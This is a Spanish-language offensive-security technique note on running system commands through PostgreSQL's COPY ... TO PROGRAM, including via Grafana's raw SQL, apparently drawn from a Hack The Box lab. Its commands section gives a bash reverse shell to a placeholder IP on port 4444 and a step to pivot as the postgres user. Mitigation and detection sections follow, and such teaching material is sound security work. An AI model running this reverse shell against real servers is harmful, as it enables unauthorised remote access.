---
topic: PostgreSQL — ejecución con COPY PROGRAM
tags: [linux, postgresql, grafana, command-execution]
---

# PostgreSQL — ejecución con COPY PROGRAM

[🌐 English](postgres-copy-program.en.md) | **Español**

## Concepto

`COPY ... FROM PROGRAM` y `COPY ... TO PROGRAM` ejecutan un comando del sistema con los privilegios del usuario de PostgreSQL. Un panel como Grafana que permite SQL arbitrario contra un datasource PostgreSQL convierte una consulta en ejecución de comandos en el servidor.

## Cuándo aplica

- Grafana u otro panel permite consultas SQL raw.
- El datasource usa un usuario con permisos de superusuario o `pg_execute_server_program`.
- El puerto de PostgreSQL es accesible desde el panel o la red.

## Procedimiento

1. Identificar el datasource y probar una consulta simple.
2. Ejecutar `COPY ... FROM PROGRAM` con un comando inocuo.
3. Lanzar una reverse shell o escribir un archivo.
4. Usar el acceso como `postgres` para pivotar.

## Comandos

```bash
psql -h 127.0.0.1 -U postgres -d postgres
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"';
# Desde Grafana, usar el datasource PostgreSQL y ejecutar la misma consulta
```

## Variantes

- Escribir un archivo con `COPY ... TO '/ruta'`.
- Usar una función PL/pgSQL con `COPY PROGRAM`.
- Aprovechar una extensión o un usuario con `pg_execute_server_program`.

## Limitaciones

- Requiere un rol con privilegios de ejecución.
- El comando corre como el usuario del servicio PostgreSQL.
- Un contenedor puede limitar las herramientas disponibles.

## Mitigación

- Revocar `pg_execute_server_program` y evitar superusuarios en datasources.
- Deshabilitar SQL raw en Grafana.
- Segmentar PostgreSQL y monitorizar comandos del proceso.

## Detección

- Consultas `COPY ... PROGRAM` en logs.
- Procesos hijos de PostgreSQL inesperados.
- Consultas raw desde paneles de visualización.

## Referencias

- [PostgreSQL — COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- [0xdf — Jupiter](https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
